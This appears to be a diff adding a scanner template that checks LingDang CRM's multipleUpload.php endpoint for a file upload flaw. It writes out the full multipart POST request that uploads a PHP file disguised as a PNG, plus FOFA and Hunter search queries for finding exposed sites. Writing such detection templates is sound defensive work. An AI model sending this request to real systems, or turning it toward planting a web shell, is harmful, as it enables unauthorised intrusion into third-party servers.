@@ -1,0 +1,22 @@
+name: LD-CRM-fileupload   #灵当CRM
+rules:
+  - method: POST
+    path: /crm/modules/Home/multipleUpload.php?myatt_id=1&myatt_moduel=1
+    headers: 
+      Content-Type: "multipart/form-data;boundary=56c3d565ed97bd2177f000e50a5b5029"
+    body: |
+        --56c3d565ed97bd2177f000e50a5b5029
+        Content-Disposition: form-data; name="file"; filename="test2.php"
+        Content-Type: image/png
+        
+        test
+        --56c3d565ed97bd2177f000e50a5b5029--
+    expression:                          
+      status_code: 
+      response_header:  
+      response_body: '{"name":"test2.php"'
+detail:
+  description: 灵当CRM multipleUpload.php接口处存在文件上传漏洞。截至2024.9.29发现部分网站还存在该漏洞
+  search: 
+    fofa: body="include/js/ldAjax.js"
+    鹰图: web.body="include/js/ldAjax.js"
